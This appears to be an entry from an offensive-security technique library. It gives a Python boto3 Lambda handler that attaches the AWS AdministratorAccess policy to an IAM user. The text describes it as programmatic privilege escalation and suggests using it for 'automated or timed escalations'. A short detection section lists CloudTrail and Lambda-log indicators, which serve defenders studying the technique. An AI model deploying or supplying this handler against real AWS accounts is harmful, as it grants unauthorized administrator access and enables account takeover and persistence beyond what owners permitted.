---
id: f0c15fde-fb2f-4190-abc9-09608330b7f1
type: code
name: boto3-attach-admin-policy-lambda
language: python
verified: true
created_at: '2023-04-06T03:56:09.319291+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
tags:
  - boto3
  - lambda
  - iam
validated: true
---

# boto3-attach-admin-policy-lambda

## Code

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
    UserName='my_username',
    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

## Description

Python code using Boto3 to attach the AdministratorAccess policy to a user within a Lambda function, enabling programmatic privilege escalation without direct CLI usage.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| UserName | IAM user to attach policy to | my_username |
| PolicyArn | ARN of the admin policy | arn:aws:iam::aws:policy/AdministratorAccess |

## Usage

Deploy this as a Lambda handler with IAM write permissions. Invoke the function to execute the attachment. Useful for automated or timed escalations.

## Detection

- Lambda execution logs showing Boto3 IAM calls.
- CloudTrail for AttachUserPolicy events triggered by Lambda.
- Monitor for unusual Lambda invocations.

## Related

- [[procedures/AWS-Shadow-Admin-Access]]
